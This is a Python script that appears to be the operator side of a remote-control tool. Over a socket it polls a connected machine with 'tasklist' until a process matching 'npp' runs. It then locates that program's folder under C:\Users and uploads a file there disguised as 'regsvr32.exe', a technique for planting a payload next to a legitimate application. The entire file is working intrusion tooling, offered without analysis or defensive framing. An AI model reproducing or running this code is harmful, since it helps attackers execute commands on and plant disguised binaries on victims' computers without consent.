import socket
import time
from lib import config, server_call as server


def find_npp_task(client: socket.socket):
    return server.call_exec(client, 'tasklist | findstr /I "npp"')


def find_npp_dir(client: socket.socket) -> str:
    return server.call_exec(client, "where /r C:\\Users *npp*.exe")


def send_regsvr32(client: socket.socket, dir: str):
    server.call_upload(client, (config.ITR_CLIENT_FILEPATH, f"{dir}\\regsvr32.exe"))


def found_npp_handler(client: socket.socket):
    res = find_npp_dir(client)
    time.sleep(5)
    send_regsvr32(client, "\\".join(res.split("\\")[:-1]))
    time.sleep(5)


def script(client: socket.socket):
    found_npp = False
    while True:
        time.sleep(2)
        if found_npp:
            break
        else:
            result = find_npp_task(client)
            if "npp" in str(result):
                found_npp = True

    found_npp_handler(client)

    server.call_quit(client)
